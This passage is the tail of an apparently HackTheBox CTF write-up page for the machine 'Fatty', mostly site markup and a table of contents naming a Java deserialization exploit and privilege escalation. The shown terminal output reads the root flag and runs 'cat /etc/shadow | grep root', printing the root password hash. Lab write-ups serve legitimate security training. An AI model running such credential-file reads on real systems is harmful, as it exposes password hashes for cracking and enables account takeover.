style="color:#F8F8F2"><span class="token plain">/root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@fatty:~# cat root.txt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">ee982fa19b413415391ed4a17b2bd9c7</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root@fatty:~# cat /etc/shadow | grep root</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">root:$6$5wAdljn7$wUeldtzWZDEtkO9OFyNfXrrxf5jnRw8uJHij.TIsiNM0ne1QzmjclfGdgdAzRWk7AQyEmQM7RfPhJbCEms5sN/:18157:0:99999:7:::</span><br></span></code></pre><div class="buttonGroup__atx"><button type="button" aria-label="Copy code to clipboard" title="Copy" class="clean-btn"><span class="copyButtonIcons_eSgA" aria-hidden="true"><svg viewBox="0 0 24 24" class="copyButtonIcon_y97N"><path fill="currentColor" d="M19,21H8V7H19M19,5H8A2,2 0 0,0 6,7V21A2,2 0 0,0 8,23H19A2,2 0 0,0 21,21V7A2,2 0 0,0 19,5M16,1H4A2,2 0 0,0 2,3V17H4V3H16V1Z"></path></svg><svg viewBox="0 0 24 24" class="copyButtonSuccessIcon_LjdS"><path fill="currentColor" d="M21,7L9,19L3.5,13.5L4.91,12.09L9,16.17L19.59,5.59L21,7Z"></path></svg></span></button></div></div></div></div><footer class="theme-doc-footer docusaurus-mt-lg"><div class="theme-doc-footer-tags-row row margin-bottom--sm"><div class="col"><b>Tags:</b><ul class="tags_jXut padding--none margin-left--sm"><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/security/">security</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/writeups/">writeups</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/linux/">linux</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/recon/">recon</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/network/">network</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/pe/">pe</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/exploit/">exploit</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/htb/">htb</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/java/">java</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/jar/">jar</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/deserialization/">deserialization</a></li><li class="tag_QGVx"><a class="tag_zVej tagRegular_sFm0" href="/writeups/tags/code-review/">code-review</a></li></ul></div></div></footer></article><nav class="pagination-nav docusaurus-mt-lg" aria-label="Docs pages"><a class="pagination-nav__link pagination-nav__link--prev" href="/writeups/HackTheBox/Dyplesher/write-up/"><div class="pagination-nav__sublabel">Previous</div><div class="pagination-nav__label">Dyplesher </div></a><a class="pagination-nav__link pagination-nav__link--next" href="/writeups/HackTheBox/ForwardSlash/write-up/"><div class="pagination-nav__sublabel">Next</div><div class="pagination-nav__label">ForwardSlash </div></a></nav></div></div><div class="col col--3"><div class="tableOfContents_bqdL thin-scrollbar theme-doc-toc-desktop"><ul class="table-of-contents table-of-contents__left-border"><li><a href="#overview" class="table-of-contents__link toc-highlight">Overview</a></li><li><a href="#network-enumeration" class="table-of-contents__link toc-highlight">Network enumeration</a></li><li><a href="#ftp" class="table-of-contents__link toc-highlight">FTP</a></li><li><a href="#java-decompiling" class="table-of-contents__link toc-highlight">Java decompiling</a></li><li><a href="#client-discovery" class="table-of-contents__link toc-highlight">Client discovery</a></li><li><a href="#code-analysis-fatty-client" class="table-of-contents__link toc-highlight">Code analysis: fatty client</a></li><li><a href="#code-analysis-fatty-server" class="table-of-contents__link toc-highlight">Code analysis: fatty server</a></li><li><a href="#java-object-deserialization-exploit" class="table-of-contents__link toc-highlight">Java object deserialization exploit</a></li><li><a href="#system-reconnaissance" class="table-of-contents__link toc-highlight">System reconnaissance</a></li><li><a href="#privilege-escalation-of-machine" class="table-of-contents__link toc-highlight">Privilege Escalation of Machine</a></li></ul></div></div></div></div></main></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">Support me</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/sponsors/S4CH" target="_blank" rel="noopener noreferrer" class="footer__link-item">Github<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Made with   ♥  by CyFun © 2023 
                            | Built on Docusaurus</div></div></div></footer></div>
<script src="/assets/js/runtime~main.3415e7ae.js"></script>
<script src="/assets/js/main.c90fa39a.js"></script>
</body>
</html>